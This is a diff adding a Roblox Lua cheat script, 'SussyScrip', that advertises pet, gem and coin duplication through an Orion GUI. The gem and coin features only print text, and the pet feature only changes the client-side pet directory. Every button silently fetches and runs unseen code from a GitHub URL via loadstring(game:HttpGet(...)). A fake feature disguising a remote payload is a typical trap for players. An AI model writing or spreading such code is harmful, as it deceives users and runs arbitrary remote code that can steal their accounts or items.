@@ -1,0 +1,172 @@
+-- Dependencies
+Directory = require(game:GetService("ReplicatedStorage").Library.Directory)
+getgenv().changes = {}
+
+function deep_copy_table(original)
+    local copy = table.clone(original)
+
+    for key, value in pairs(copy) do
+        if type(value) == 'table' then
+            copy[key] = table.clone(value)
+        end
+    end
+
+    return copy
+end
+
+function change_visual(from, to, isGem, numberOfItems)
+    if isGem then
+        -- Gem visual logic
+        print("Visually changing gem amount to: " .. numberOfItems)
+        -- Add your logic here to visually change gems
+        -- This will not reference the pets directory since gems are handled differently.
+        -- If you need specific gem logic, this is where it goes.
+    else
+        if table.find(getgenv().changes, {from, to}) then
+            print("please reset changes to change this pet again")
+            return
+        end
+
+        -- Store the changes for pets
+        table.insert(getgenv().changes, {from, to, deep_copy_table(Directory.Pets[from]), deep_copy_table(Directory.Pets[to])})
+
+        -- Pet duplication visual logic
+        for i, v in pairs(Directory.Pets[from]) do
+            Directory.Pets[from][i] = nil
+        end
+
+        for i, v in pairs(Directory.Pets[to]) do
+            Directory.Pets[from][i] = v
+        end
+    end
+end
+
+function change_coins_visual(amount)
+    -- Coin visual logic
+    print("Visually changing coin amount to: " .. amount)
+    -- Add logic here to visually change coins (separate from pets and gems)
+end
+
+-- Function to execute the external script
+local function execute_external_script()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/sussycloud/directoryps99/refs/heads/main/library0.1"))()
+end
+
+-- Setup Orion Library
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "SussyScrip 🔥", IntroText = "Pet, Gem & Coin Duplication Tool 🔥", HidePremium = false, SaveConfig = true, ConfigFolder = "SUSSYCONFIG"})
+
+-- Pet Visual Tab
+local PetVisualTab = Window:MakeTab({
+    Name = "Pet Visual",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+-- Textbox for existing pet name
+local petFrom, petTo
+PetVisualTab:AddTextbox({
+    Name = "Name of the Pet",
+    Default = "",
+    TextDisappear = true,
+    Callback = function(existingName)
+        petFrom = existingName
+    end
+})
+
+-- Textbox for new pet name
+PetVisualTab:AddTextbox({
+    Name = "Name Pet to be Visual",
+    Default = "",
+    TextDisappear = true,
+    Callback = function(newName)
+        petTo = newName
+    end
+})
+
+-- Textbox for number of pets
+local petNumber = 1
+PetVisualTab:AddTextbox({
+    Name = "Number of Pets",
+    Default = "1",
+    TextDisappear = true,
+    Callback = function(petCount)
+        petNumber = tonumber(petCount) or 1
+    end
+})
+
+-- Button to Visual Pet
+PetVisualTab:AddButton({
+    Name = "Visual Pet 🔄",
+    Icon = "rbxassetid://4483345998",
+    Callback = function()
+        execute_external_script()  -- Load the external script when the button is clicked
+        change_visual(petFrom, petTo, false, petNumber)
+    end
+})
+
+-- Gem Visual Tab
+local GemVisualTab = Window:MakeTab({
+    Name = "Gem Visual",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+-- Textbox for number of gems
+local gemNumber = 1
+GemVisualTab:AddTextbox({
+    Name = "Number of Gems",
+    Default = "1",
+    TextDisappear = true,
+    Callback = function(gemCount)
+        gemNumber = tonumber(gemCount) or 1
+    end
+})
+
+-- Button to Visual Gems
+GemVisualTab:AddButton({
+    Name = "Visual Gems 💎",
+    Icon = "rbxassetid://4483345998",
+    Callback = function()
+        execute_external_script()  -- Load the external script when the button is clicked
+        change_visual(nil, nil, true, gemNumber)
+    end
+})
+
+-- Coin Visual Tab
+local CoinVisualTab = Window:MakeTab({
+    Name = "Coin Visual",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+-- Textbox for changing coin amount
+local coinAmount = 0
+CoinVisualTab:AddTextbox({
+    Name = "Amount of Coins",
+    Default = "0",
+    TextDisappear = true,
+    Callback = function(amount)
+        coinAmount = tonumber(amount) or 0
+    end
+})
+
+-- Button to change Coin Visual
+CoinVisualTab:AddButton({
+    Name = "Change Coin Visual 💰",
+    Icon = "rbxassetid://4483345998",
+    Callback = function()
+        execute_external_script()  -- Load the external script when the button is clicked
+        change_coins_visual(coinAmount)
+    end
+})
+
+-- Credit Section
+local CreditTab = Window:MakeTab({
+    Name = "Credits",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+CreditTab:AddLabel("Credits:")
+CreditTab:AddLabel("🔥 SussyScrip 🔥")
